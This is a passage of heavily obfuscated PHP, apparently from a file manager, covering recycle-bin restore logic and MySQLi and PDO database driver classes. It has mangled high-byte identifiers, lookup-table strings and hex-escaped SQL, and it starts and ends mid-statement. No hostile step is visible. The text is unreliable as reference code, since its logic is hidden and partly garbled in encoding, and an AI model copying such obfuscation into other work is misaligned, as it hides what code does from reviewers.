removeUserAll($ºÒ‹ğ¤) { $this->remove(!1, $ºÒ‹ğ¤); } private function _restoreSource($¦ü°²¤Ø, $èÇî€Ï‘) { $ü«—œà§ =& $_SERVER[® ¨Ä®ñ]; $ŞŞÚƒ…È = Model($ü«—œà§[1309]); $èÇî€Ï‘ = $èÇî€Ï‘ == !1 ? !1 : $èÇî€Ï‘; if (!$¦ü°²¤Ø) { return !0; } $’Ùà‚ù« = array(); foreach ($¦ü°²¤Ø as $”ŒĞß»Ş) { if ($èÇî€Ï‘ != !1 && !in_array($”ŒĞß»Ş, $èÇî€Ï‘)) { continue; } $ëµë¨‡” = $ŞŞÚƒ…È->sourceInfo($”ŒĞß»Ş); $Øê”Öí = $ŞŞÚƒ…È->sourceInfo($ëµë¨‡”[$ü«—œà§[489]]); if ($Øê”Öí[$ü«—œà§[422]] == $ü«—œà§[89]) { continue; } $ŞŞÚƒ…È->lockMoveStart($”ŒĞß»Ş); $this->recycleMove($”ŒĞß»Ş, 0); if ($ëµë¨‡”[$ü«—œà§[402]] == $ü«—œà§[89]) { $Š–³ƒ¨ú = array($ü«—œà§[575] => array($ü«—œà§[535], $ëµë¨‡”[$ü«—œà§[512]] . $”ŒĞß»Ş . $ü«—œà§[536])); $ŞŞÚƒ…È->where($Š–³ƒ¨ú)->setField($ü«—œà§[422], 0); $this->restoreFolderChildren($”ŒĞß»Ş, $¦ü°²¤Ø); } $this->where(array($ü«—œà§[394] => $”ŒĞß»Ş))->delete(); $ŞŞÚƒ…È->folderSizeReset($ëµë¨‡”[$ü«—œà§[489]]); $’Ùà‚ù«[] = $ëµë¨‡”[$ü«—œà§[489]]; if ($ëµë¨‡”[$ü«—œà§[402]] == $ü«—œà§[89]) { $’Ùà‚ù«[] = $”ŒĞß»Ş; } $ŞŞÚƒ…È->lockMoveEnd($”ŒĞß»Ş); } $ŞŞÚƒ…È->updateModifyTime($’Ùà‚ù«); } private function restoreFolderChildren($Îò¹ş“—, $¦ÁÇšª) { $îÌÍ¤Şš =& $_SERVER[® ¨Ä®ñ]; $´Ü½µ„Ä = Model($îÌÍ¤Şš[1309]); $’×Ôº = array($îÌÍ¤Şš[394] => array($îÌÍ¤Şš[7], array())); foreach ($¦ÁÇšª as $¢¶İ’íª) { if ($¢¶İ’íª == $Îò¹ş“—) { continue; } if (!$´Ü½µ„Ä->isParentOf($Îò¹ş“—, $¢¶İ’íª)) { continue; } $ÏçÏòÇ¡ = $´Ü½µ„Ä->sourceInfo($¢¶İ’íª); if ($ÏçÏòÇ¡[$îÌÍ¤Şš[402]] == $îÌÍ¤Şš[89]) { $’×Ôº[] = array($îÌÍ¤Şš[575] => array($îÌÍ¤Şš[535], $ÏçÏòÇ¡[$îÌÍ¤Şš[512]] . $¢¶İ’íª . $îÌÍ¤Şš[536])); } else { $’×Ôº[$îÌÍ¤Şš[394]][1][] = $¢¶İ’íª; } } if (!$’×Ôº[$îÌÍ¤Şš[394]][1]) { unset($’×Ôº[$îÌÍ¤Şš[394]]); } if (!$’×Ôº) { return; } $’×Ôº[$îÌÍ¤Şš[394]][1] = array_unique($’×Ôº[$îÌÍ¤Şš[394]][1]); $’×Ôº[$îÌÍ¤Şš[984]] = $îÌÍ¤Şš[1902]; $´Ü½µ„Ä->where($’×Ôº)->setField($îÌÍ¤Şš[422], 1); } private function recycleMove($½›°õô©, $¯šÈ¶á» = 1) { $”üÔÙ®Ê =& $_SERVER[® ¨Ä®ñ]; $Šç”™Ì = Model($”üÔÙ®Ê[1309]); $™‘âÄÇô = Model($”üÔÙ®Ê[2107]); $ÎöÛñ½Ã = array($”üÔÙ®Ê[394] => $½›°õô©); if ($¯šÈ¶á») { $Šç”™Ì->where($ÎöÛñ½Ã)->setField($”üÔÙ®Ê[422], 1); $™‘âÄÇô->eventRecycle($½›°õô©, $”üÔÙ®Ê[2108]); } else { $Ñ·ğœ÷ = $Šç”™Ì->where($ÎöÛñ½Ã)->find(); $ÎÛßÏ¡˜ = $Ñ·ğœ÷[$”üÔÙ®Ê[402]] == $”üÔÙ®Ê[89]; $†èòâ‹Œ = $Šç”™Ì->fileNameAuto($Ñ·ğœ÷[$”üÔÙ®Ê[489]], $Ñ·ğœ÷[$”üÔÙ®Ê[32]], REPEAT_RENAME_FOLDER, $ÎÛßÏ¡˜); if ($†èòâ‹Œ != $Ñ·ğœ÷[$”üÔÙ®Ê[32]]) { $Šç”™Ì->rename($½›°õô©, $†èòâ‹Œ); } $Šç”™Ì->where($ÎöÛñ½Ã)->setField($”üÔÙ®Ê[422], 0); $™‘âÄÇô->eventRecycle($½›°õô©, $”üÔÙ®Ê[2109]); } } } goto d²îŞ¨¾ÊŠ; bä¬×ˆ«Â: class DbMysqli extends Db { public function __construct($Õ®ò“öÎ = '') { $‘¦‚”Ÿ =& $_SERVER[® ¨Ä®ñ]; if (!extension_loaded($‘¦‚”Ÿ[894])) { think_exception(think_lang($‘¦‚”Ÿ[14]) . $‘¦‚”Ÿ[895]); } if (!empty($Õ®ò“öÎ)) { $this->config = $Õ®ò“öÎ; if (empty($this->config[$‘¦‚”Ÿ[17]])) { $this->config[$‘¦‚”Ÿ[17]] = $‘¦‚”Ÿ[12]; } } } public function connect($Ú¨Üó‚¤ = '', $áÕÀÀ€ = 0) { $ÇØóˆˆë =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->linkID[$áÕÀÀ€])) { if (empty($Ú¨Üó‚¤)) { $Ú¨Üó‚¤ = $this->config; } $this->linkID[$áÕÀÀ€] = new mysqli($Ú¨Üó‚¤[$ÇØóˆˆë[868]], $Ú¨Üó‚¤[$ÇØóˆˆë[870]], $Ú¨Üó‚¤[$ÇØóˆˆë[871]], $Ú¨Üó‚¤[$ÇØóˆˆë[21]], $Ú¨Üó‚¤[$ÇØóˆˆë[869]] ? intval($Ú¨Üó‚¤[$ÇØóˆˆë[869]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Î˜î€Î¦ = $this->linkID[$áÕÀÀ€]->server_version; $this->linkID[$áÕÀÀ€]->query($ÇØóˆˆë[872] . think_config($ÇØóˆˆë[873]) . $ÇØóˆˆë[58]); if ($Î˜î€Î¦ > $ÇØóˆˆë[874]) { $this->linkID[$áÕÀÀ€]->query($ÇØóˆˆë[875]); } $this->connected = !0; if (1 != think_config($ÇØóˆˆë[22])) { unset($this->config); } } return $this->linkID[$áÕÀÀ€]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ïşõÉµí) { $ÈËÜ¤‹ô =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ïşõÉµí; if ($this->queryID) { $this->free(); } think_action_status($ÈËÜ¤‹ô[23], 1); think_status($ÈËÜ¤‹ô[24]); $this->queryID = $this->_linkID->query($ïşõÉµí); if ($this->_linkID->more_results()) { while (($ôæª¥•Ä = $this->_linkID->next_result()) != NULL) { $ôæª¥•Ä->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÖãıÅµ˜) { $¦£ãäÒø =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÖãıÅµ˜; if ($this->queryID) { $this->free(); } think_action_status($¦£ãäÒø[25], 1); think_status($¦£ãäÒø[24]); $ú¶îªå× = $this->_linkID->query($ÖãıÅµ˜); $this->debug(); if (!1 === $ú¶îªå×) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä·¤êúœ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ä·¤êúœ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¾àÁôÙü = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¾àÁôÙü) { $this->error(); return !1; } } return !0; } private function getAll() { $¢Îìš¯ = array(); if ($this->numRows > 0) { for ($ƒÎœÏßí = 0; $ƒÎœÏßí < $this->numRows; $ƒÎœÏßí++) { $¢Îìš¯[$ƒÎœÏßí] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¢Îìš¯; } public function getFields($ÃÀ¶Ãöù) { $‚¸Íõµ =& $_SERVER[® ¨Ä®ñ]; $¸¥×æÇ× = $this->query($‚¸Íõµ[879] . $this->parseKey($ÃÀ¶Ãöù)); $ñ„ßÅĞ¤ = array(); if ($¸¥×æÇ×) { foreach ($¸¥×æÇ× as $€Ä·İã‘ => $›¹ÒÂÇ) { $ñ„ßÅĞ¤[$›¹ÒÂÇ[$‚¸Íõµ[31]]] = array($‚¸Íõµ[32] => $›¹ÒÂÇ[$‚¸Íõµ[31]], $‚¸Íõµ[33] => $›¹ÒÂÇ[$‚¸Íõµ[34]], $‚¸Íõµ[35] => (bool) ($›¹ÒÂÇ[$‚¸Íõµ[36]] === $‚¸Íõµ[12]), $‚¸Íõµ[37] => $›¹ÒÂÇ[$‚¸Íõµ[38]], $‚¸Íõµ[39] => strtolower($›¹ÒÂÇ[$‚¸Íõµ[40]]) == $‚¸Íõµ[41], $‚¸Íõµ[42] => strtolower($›¹ÒÂÇ[$‚¸Íõµ[43]]) == $‚¸Íõµ[44]); } } return $ñ„ßÅĞ¤; } public function getTables($íÔñ¦ô© = '') { $û›…Êº =& $_SERVER[® ¨Ä®ñ]; $êñÓéÔ = !empty($íÔñ¦ô©) ? $û›…Êº[881] . $íÔñ¦ô© . $û›…Êº[882] : $û›…Êº[883]; $³Ú´€¦Š = $this->query($êñÓéÔ); $¯ü¾è… = array(); if ($³Ú´€¦Š) { foreach ($³Ú´€¦Š as $Çç¶³Õï => $ÇÌş‹Œê) { $¯ü¾è…[$Çç¶³Õï] = current($ÇÌş‹Œê); } } return $¯ü¾è…; } public function replace($úı«ñÌ, $åèçÆ²î = array()) { $‡Ø®‰ =& $_SERVER[® ¨Ä®ñ]; foreach ($úı«ñÌ as $»“úãÃ­ => $‰–ŒÏ‰ğ) { $´”©óÖ = $this->parseValue($‰–ŒÏ‰ğ); if (is_scalar($´”©óÖ)) { $õ¨“Û§[] = $´”©óÖ; $çéÀÄî½[] = $this->parseKey($»“úãÃ­); } } $‡ÙßÍœù = $‡Ø®‰[884] . $this->parseTable($åèçÆ²î[$‡Ø®‰[274]]) . $‡Ø®‰[885] . implode($‡Ø®‰[50], $çéÀÄî½) . $‡Ø®‰[886] . implode($‡Ø®‰[50], $õ¨“Û§) . $‡Ø®‰[887]; return $this->execute($‡ÙßÍœù); } public function insertAll($’š¿±», $á½ì»±À = array(), $À±Óä©Ú = false) { $æÆáŸ‘Ñ =& $_SERVER[® ¨Ä®ñ]; if (!is_array($’š¿±»[0])) { return !1; } $ÆŸØşÄ˜ = array_keys($’š¿±»[0]); $ˆÅ»Ó¨§ = array(); foreach ($’š¿±» as $§­¡¿‘è) { $§¬ƒÁ‹ = array(); foreach ($§­¡¿‘è as $ •ŒõÅÏ => $úÒØİñø) { $úÒØİñø = $this->parseValue($úÒØİñø); if (is_scalar($úÒØİñø)) { $§¬ƒÁ‹[] = $úÒØİñø; } } $ˆÅ»Ó¨§[] = $æÆáŸ‘Ñ[255] . implode($æÆáŸ‘Ñ[50], $§¬ƒÁ‹) . $æÆáŸ‘Ñ[887]; } array_walk($ÆŸØşÄ˜, array($this, $æÆáŸ‘Ñ[888])); $×™ªìí© = $À±Óä©Ú ? $æÆáŸ‘Ñ[889] : $æÆáŸ‘Ñ[890]; $Ş ³¼ƒ = $×™ªìí© . $æÆáŸ‘Ñ[891] . $this->parseTable($á½ì»±À[$æÆáŸ‘Ñ[274]]) . $æÆáŸ‘Ñ[885] . implode($æÆáŸ‘Ñ[50], $ÆŸØşÄ˜) . $æÆáŸ‘Ñ[892] . implode($æÆáŸ‘Ñ[50], $ˆÅ»Ó¨§); return $this->execute($Ş ³¼ƒ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‚ªÎãóã =& $_SERVER[® ¨Ä®ñ]; $this->error = $this->_linkID->errno . $‚ªÎãóã[4] . $this->_linkID->error; if ($‚ªÎãóã[12] != $this->queryStr) { $this->error .= LNG($‚ªÎãóã[48]) . $this->queryStr; } think_trace($this->error, $‚ªÎãóã[12], $‚ªÎãóã[49]); return $this->error; } public function escapeString($³˜àº¾˜) { if ($this->_linkID) { return $this->_linkID->real_escape_string($³˜àº¾˜); } else { return addslashes($³˜àº¾˜); } } public function parseKey(&$ûä€šõÑ, $îªÌËÓİ = true) { $ÉÚäã·Õ =& $_SERVER[® ¨Ä®ñ]; if ($îªÌËÓİ) { $ûä€šõÑ = $this->parseKeyCheck($ûä€šõÑ); } if ($ûä€šõÑ != $ÉÚäã·Õ[181] && !preg_match($ÉÚäã·Õ[893], $ûä€šõÑ)) { $ûä€šõÑ = $ÉÚäã·Õ[380] . trim($ûä€šõÑ, $ÉÚäã·Õ[380]) . $ÉÚäã·Õ[380]; } return $ûä€šõÑ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÑˆÅÜ = '') { $ã…ñüıú =& $_SERVER[® ¨Ä®ñ]; if (!class_exists($ã…ñüıú[896])) { think_exception(think_lang($ã…ñüıú[14]) . $ã…ñüıú[897]); } if (!empty($ÑˆÅÜ)) { $this->config = $ÑˆÅÜ; if (empty($this->config[$ã…ñüıú[17]])) { $this->config[$ã…ñüıú[17]] = array(); } } } public function connect($ÖŸ€ñ´´ = '', $àÃş–Åó = 0) { $­öôŠœ =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->linkID[$àÃş–Åó])) { if (empty($ÖŸ€ñ´´)) { $ÖŸ€ñ´´ = $this->config; } $‚Õ‚Ìˆ = !empty($ÖŸ€ñ´´[$­öôŠœ[17]][$­öôŠœ[18]]) ? $ÖŸ€ñ´´[$­öôŠœ[17]][$­öôŠœ[18]] : $this->pconnect; if ($‚Õ‚Ìˆ) { $ÖŸ€ñ´´[$­öôŠœ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$àÃş–Åó] = new PDO($ÖŸ€ñ´´[$­öôŠœ[898]], $ÖŸ€ñ´´[$­öôŠœ[870]], $ÖŸ€ñ´´[$­öôŠœ[871]], $ÖŸ€ñ´´[$­öôŠœ[17]]); } catch (PDOException $¡Ã£ °‘) { think_exception($¡Ã£ °‘->getMessage()); } $this->dbType = $this->_getDsnType($ÖŸ€ñ´´[$­öôŠœ[898]]); if (in_array($this->dbType, array($­öôŠœ[899], $­öôŠœ[900], $­öôŠœ[901], $­öôŠœ[902]))) { think_exception($­öôŠœ[903] . $this->dbType . $­öôŠœ[904] . $this->dbType . $­öôŠœ[905]); } if (!$this->linkID[$àÃş–Åó]) { think_exception($­öôŠœ[906]); } try { $this->linkID[$àÃş–Åó]->exec($­öôŠœ[907] . think_config($­öôŠœ[873])); } catch (Exception $¡Ã£ °‘) { } $this->connected = !0; if (1 != think_config($­öôŠœ[22])) { unset($this->config); } } return $this->linkID[$àÃş–Åó]; } public function free() { $this->PDOStatement = null; } public function query($ªÑáÅÒÀ, $óÑ— Ç = array()) { $ÆŒ÷Ëï  =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ªÑáÅÒÀ; if (!empty($óÑ— Ç)) { $this->queryStr .= $ÆŒ÷Ëï [908] . print_r($óÑ— Ç, !0) . $ÆŒ÷Ëï [909]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÆŒ÷Ëï [23], 1); think_status($ÆŒ÷Ëï [24]); $this->PDOStatement = $this->_linkID->prepare($ªÑáÅÒÀ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $öüìŠÚú = $this->PDOStatement->execute($óÑ— Ç); $this->debug(); if (!1 === $öüìŠÚú) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ò»¸ß‚„, $¤”™Î»ì = array()) { $êÎû¾î =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ò»¸ß‚„; if (!empty($¤”™Î»ì)) { $this->queryStr .= $êÎû¾î[908] . print_r($¤”™Î»ì, !0) . $êÎû¾î[909]; } $¼¿¥§£Ú = !1; if ($this->dbType == $êÎû¾î[902]) { if (preg_match($êÎû¾î[910], $this->queryStr, $×¢¦³¤ï)) { $this->table = think_config($êÎû¾î[911]) . str_ireplace(think_config($êÎû¾î[912]), $êÎû¾î[373], $×¢¦³¤ï[2]); $¼¿¥§£Ú = (bool) $this->query($êÎû¾î[913] . strtoupper($this->table) . $êÎû¾î[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($êÎû¾î[25], 1); think_status($êÎû¾î[24]); $this->PDOStatement = $this->_linkID->prepare($ò»¸ß‚„); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $œ™ƒ†ıı = $this->PDOStatement->execute($¤”™Î»ì); $this->debug(); if (!1 === $œ™ƒ†ıı) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¼¿¥§£Ú || preg_match($êÎû¾î[914], $ò»¸ß‚„)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¤ßºÜØ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¤ßºÜØ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ä³ËÊåğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ä³ËÊåğ) { $this->error(); return !1; } } return !0; } private function getAll() { $¨´üªîÕ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¨´üªîÕ); return $¨´üªîÕ; } public function getFields($©Ï¬Š¾„) { $µ²æ·ö¢ =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!0); if (think_config($µ²æ·ö¢[915])) { $³°­ğ¸à = str_replace($µ²æ·ö¢[916], $©Ï¬Š¾„, think_config($µ²æ·ö¢[915])); } else { switch ($this->dbType) { case $µ²æ·ö¢[899]: case $µ²æ·ö¢[917]: $³°­ğ¸à = "\123\105\x4c\105\x43\x54\x20\40\x20\143\157\x6c\x75\155\156\137\156\x61\155\145\40\x61\x73\x20\47\x4e\141\155\145\47\x2c\40\x20\x20\x64\141\x74\141\x5f\164\171\160\x65\x20\141\x73\x20\47\124\x79\160\x65\x27\x2c\40\x20\x20\x63\x6f\x6c\x75\x6d\156\137\x64\x65\x66\x61\165\154\164\x20\x61\x73\x20\x27\x44\145\146\x61\165\x6c\x74\x27\54\40\x20\40\x69\x73\137\156\165\154\x6c\141\142\154\145\x20\x61\x73\40\47\116\x75\154\x6c\47\xa\11\11\x46\x52\x4f\115\11\x69\156\146\x6f\x72\x6d\x61\x74\151\x6f\x6e\137\x73\143\x68\x65\x6d\141\x2e\164\x61\x62\x6c\145\163\x20\101\123\40\164\12\x9\x9\112\x4f\111\x4e\x9\151\156\146\157\x72\155\x61\x74\151\157\x6e\137\163\143\x68\x65\x6d\141\x2e\143\x6f\x6c\x75\x6d\x6e\163\40\101\123\x20\x63\12\11\x9\117\116\40\40\164\x2e\164\141\142\x6c\x65\x5f\143\141\x74\141\154\157\x67\40\x3d\40\143\x2e\164\141\x62\154\145\137\x63\x61\x74\x61\x6c\x6f\x67\xa\x9\x9\101\x4e\104\40\164\56\164\141\142\x6c\145\x5f\163\x63\x68\145\x6d\141\40\75\40\143\x2e\164\141\x62\154\145\137\x73\x63\150\145\155\141\xa\11\11\x41\116\x44\x20\164\x2e\164\141\142\x6c\x65\x5f\x6e\x61\x6d\145\x20\75\x20\x63\56\164\141\142\154\x65\x5f\x6e\x61\x6d\x65\xa\x9\11\x57\x48\105\x52\x45\x20\x20\40\x74\x2e\x74\x61\142\x6c\x65\137\156\141\155\145\x20\x3d\40\x27{$©Ï¬Š¾„}\x27"; break; case $µ²æ·ö¢[918]: $³°­ğ¸à = $µ²æ·ö¢[919] . $©Ï¬Š¾„ . $µ²æ·ö¢[920]; break; case $µ²æ·ö¢[900]: case $µ²æ·ö¢[902]: $³°­ğ¸à = $µ²æ·ö¢[921] . $µ²æ·ö¢[922] . $µ²æ·ö¢[923] . strtoupper($©Ï¬Š¾„) . $µ²æ·ö¢[924] . strtoupper($©Ï¬Š¾„) . $µ²æ·ö¢[925]; break; case $µ²æ·ö¢[926]: $³°­ğ¸à = $µ²æ·ö¢[927] . $©Ï¬Š¾„ . $µ²æ·ö¢[928]; break; case $µ²æ·ö¢[901]: break; case $µ²æ·ö¢[929]: default: $³°­ğ¸à = $µ²æ·ö¢[930] . ($this->dbType == $µ²æ·ö¢[929] ? "\140{$©Ï¬Š¾„}\140" : $©Ï¬Š¾„); } } $àÓÉ–œõ = $this->query($³°­ğ¸à); $úÚÚ¢Ÿç = array(); if ($àÓÉ–œõ) { foreach ($àÓÉ–œõ as $½±œÌ±¼ => $…£ç—“) { $…£ç—“ = array_change_key_case($…£ç—“); $…£ç—“[$µ²æ·ö¢[32]] = isset($…£ç—“[$µ²æ·ö¢[32]]) ? $…£ç—“[$µ²æ·ö¢[32]] : $µ²æ·ö¢[373]; $…£ç—“[$µ²æ·ö¢[33]] = isset($…£ç—“[$µ²æ·ö¢[33]]) ? $…£ç—“[$µ²æ·ö¢[33]] : $µ²æ·ö¢[373]; $‰Ãæ‘…± = isset($…£ç—“[$µ²æ·ö¢[268]]) ? $…£ç—“[$µ²æ·ö¢[268]] : $…£ç—“[$µ²æ·ö¢[32]]; $úÚÚ¢Ÿç[$‰Ãæ‘…±] = array($µ²æ·ö¢[32] => $‰Ãæ‘…±, $µ²æ·ö¢[33] => $…£ç—“[$µ²æ·ö¢[33]], $µ²æ·ö¢[35] => (bool) (isset($…£ç—“[$µ²æ·ö¢[104]]) && $…£ç—“[$µ²æ·ö¢[104]] === $µ²æ·ö¢[12] || isset($…£ç—“[$µ²æ·ö¢[35]]) && $…£ç—“[$µ²æ·ö¢[35]] === $µ²æ·ö¢[12]), $µ²æ·ö¢[37] => isset($…£ç—“[$µ²æ·ö¢[37]]) ? $…£ç—“[$µ²æ·ö¢[37]] : (isset($…£ç—“[$µ²æ·ö¢[56]]) ? $…£ç—“[$µ²æ·ö¢[56]] : $µ²æ·ö¢[373]), $µ²æ·ö¢[39] => isset($…£ç—“[$µ²æ·ö¢[95]]) ? strtolower($…£ç—“[$µ²æ·ö¢[95]]) == $µ²æ·ö¢[41] : (isset($…£ç—“[$µ²æ·ö¢[57]]) ? $…£ç—“[$µ²æ·ö¢[57]] : !1), $µ²æ·ö¢[42] => isset($…£ç—“[$µ²æ·ö¢[931]]) ? strtolower($…£ç—“[$µ²æ·ö¢[931]]) == $µ²æ·ö¢[44] : (isset($…£ç—“[$µ²æ·ö¢[95]]) ? $…£ç—“[$µ²æ·ö¢[95]] : !1)); } } return $úÚÚ¢Ÿç; } public function getTables($’€×¶¥“ = '') { $¦Î‹Æ±Ò =& $_SERVER[® ¨Ä®ñ]; if (think_config($¦Î‹Æ±Ò[932])) { $Ğ­›®±ø = str_replace($¦Î‹Æ±Ò[933], $’€×¶¥“, think_config($¦Î‹Æ±Ò[932])); } else { switch ($this->dbType) { case $¦Î‹Æ±Ò[900]: case $¦Î‹Æ±Ò[902]: $Ğ­›®±ø = $¦Î‹Æ±Ò[934]; break; case $¦Î‹Æ±Ò[899]: case $¦Î‹Æ±Ò[917]: $Ğ­›®±ø = $¦Î‹Æ±Ò[935]; break; case $¦Î‹Æ±Ò[926]: $Ğ­›®±ø = $¦Î‹Æ±Ò[936]; break; case $¦Î‹Æ±Ò[901]: think_exception(think_lang($¦Î‹Æ±Ò[937]) . $¦Î‹Æ±Ò[938]); break; case $¦Î‹Æ±Ò[918]: $Ğ­›®±ø = $¦Î‹Æ±Ò[45] . $¦Î‹Æ±Ò[46] . $¦Î‹Æ±Ò[47]; break; case $¦Î‹Æ±Ò[929]: default: if (!empty($’€×¶¥“)) { $Ğ­›®±ø = $¦Î‹Æ±Ò[881] . $’€×¶¥“ . $¦Î‹Æ±Ò[882]; } else { $Ğ­›®±ø = $¦Î‹Æ±Ò[883]; } } } $’“ÏÈêÄ = $this->query($Ğ­›®±ø); $¾«²ıŠ± = array(); foreach ($’“ÏÈêÄ as $å¢ÚĞë‡ => $ùåò†»¦) { $¾«²ıŠ±[$å¢ÚĞë‡] = current($ùåò†»¦); } return $¾«²ıŠ±; } protected function parseLimit($¦×ƒÛË ) { $ÉĞİıúÃ =& $_SERVER[® ¨Ä®ñ]; $Ğ†î÷ª® = $ÉĞİıúÃ[12]; if (!empty($¦×ƒÛË )) { switch ($this->dbType) { case $ÉĞİıúÃ[926]: case $ÉĞİıúÃ[918]: $¦×ƒÛË  = explode($ÉĞİıúÃ[50], $¦×ƒÛË ); if (count($¦×ƒÛË ) > 1) { $Ğ†î÷ª® .= $ÉĞİıúÃ[51] . $¦×ƒÛË [1] . $ÉĞİıúÃ[52] . $¦×ƒÛË [0] . $ÉĞİıúÃ[53]; } else { $Ğ†î÷ª® .= $ÉĞİıúÃ[51] . $¦×ƒÛË [0] . $ÉĞİıúÃ[53]; } break; case $ÉĞİıúÃ[899]: case $ÉĞİıúÃ[917]: break; case $ÉĞİıúÃ[901]: break; case $ÉĞİıúÃ[900]: case $ÉĞİıúÃ[902]: break; case $ÉĞİıúÃ[929]: default: $Ğ†î÷ª® .= $ÉĞİıúÃ[51] . $¦×ƒÛË  . $ÉĞİıúÃ[53]; } } return $Ğ†î÷ª®; } public function parseKey(&$ÒïåûÆ‚, $ÄÚı¡ı = true) { $¸ãÚ« =& $_SERVER[® ¨Ä®ñ]; if ($ÄÚı¡ı) { $ÒïåûÆ‚ = $this->parseKeyCheck($ÒïåûÆ‚); } if ($this->dbType == $¸ãÚ«[929]) { if ($ÒïåûÆ‚ != $¸ãÚ«[181] && !preg_match($¸ãÚ«[893], $ÒïåûÆ‚)) { $ÒïåûÆ‚ = $¸ãÚ«[380] . trim($ÒïåûÆ‚, $¸ãÚ«[380]) . $¸ãÚ«[380]; } return $ÒïåûÆ‚; } else { return parent::parseKey($ÒïåûÆ‚, $ÄÚı¡ı); } } public function close() { $this->_linkID = null; } public function error() { $‰†áí¸ú =& $_SERVER[® ¨Ä®ñ]; if ($this->PDOStatement) { $íîÔ›îî = $this->PDOStatement->errorInfo(); $this->error = $íîÔ›îî[1] . $‰†áí¸ú[4] . $íîÔ›îî[2]; } else { $this->error = $‰†áí¸ú[12]; } if ($‰†áí¸ú[12] != $this->queryStr) { $this->error .= LNG($‰†áí¸ú[48]) . $this->queryStr; } think_trace($this->error, $‰†áí¸ú[12], $‰†áí¸ú[49]); return $this->error; } public function escapeString($µª–Èºœ) { $ıó´øË§ =& $_SERVER[® ¨Ä®ñ]; switch ($this->dbType) { case $ıó´øË§[926]: case $ıó´øË§[899]: case $ıó´øË§[917]: case $ıó´øË§[929]: return addslashes($µª–Èºœ); case $ıó´øË§[901]: case $ıó´øË§[918]: case $ıó´øË§[900]: case $ıó´øË§[902]: return str_ireplace($ıó´øË§[58], $ıó´øË§[59], $µª–Èºœ); } } protected function parseValue($€Ê„ˆ˜ñ) { $ğ†ÑÕ–· =& $_SERVER[® ¨Ä®ñ]; if (is_string($€Ê„ˆ˜ñ)) { $Õ½Íåå‡ = strpos($€Ê„ˆ˜ñ, $ğ†ÑÕ–·[4]) === 0 && in_array($€Ê„ˆ˜ñ, array_keys($this->bind)); $€Ê„ˆ˜ñ = $Õ½Íåå‡ ? $this->escapeString($€Ê„ˆ˜ñ) : $ğ†ÑÕ–·[939] . $this->escapeString($€Ê„ˆ˜ñ) . $ğ†ÑÕ–·[939]; } elseif (isset($€Ê„ˆ˜ñ[0]) && is_string($€Ê„ˆ˜ñ[0]) && strtolower($€Ê„ˆ˜ñ[0]) == $ğ†ÑÕ–·[292]) { $€Ê„ˆ˜ñ = $this->escapeString($€Ê„ˆ˜ñ[1]); } elseif (is_array($€Ê„ˆ˜ñ)) { $€Ê„ˆ˜ñ = array_map(array($this, $ğ†ÑÕ–·[940]), $€Ê„ˆ˜ñ); } elseif (is_bool($€Ê„ˆ˜ñ)) { $€Ê„ˆ˜ñ = $€Ê„ˆ˜ñ ? $ğ†ÑÕ–·[89] : $ğ†ÑÕ–·[190]; } elseif (is_null($€Ê„ˆ˜ñ)) { $€Ê„ˆ˜ñ = $ğ†ÑÕ–·[104]; } return $€Ê„ˆ˜ñ; } public function getLastInsertId() { $‘¸÷¹–í =& $_SERVER[® ¨Ä®ñ]; switch ($this->dbType) { case $‘¸÷¹–í[926]: case $‘¸÷¹–í[918]: case $‘¸÷¹–í[899]: case $‘¸÷¹–í[917]: case $‘¸÷¹–í[901]: case $‘¸÷¹–í[929]: return $this->_linkID->lastInsertId(); case $‘¸÷¹–í[900]: case $‘¸÷¹–í[902]: $ä–Ü¢Â— = $this->table; $Ô„¾„Ó = $this->query("\x53\x45\114\105\103\x54\x20{$ä–Ü¢Â—}\56\143\165\162\162\x76\x61\x6c\40\x63\x75\162\x72\166\x61\x6c\40\x46\122\x4f\x4d\40\144\165\x61\154"); return $Ô„¾„Ó ? $Ô„¾„Ó[0][$‘¸÷¹–í[941]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($µüµ¯º) { $áı“éÅ =& $_SERVER[® 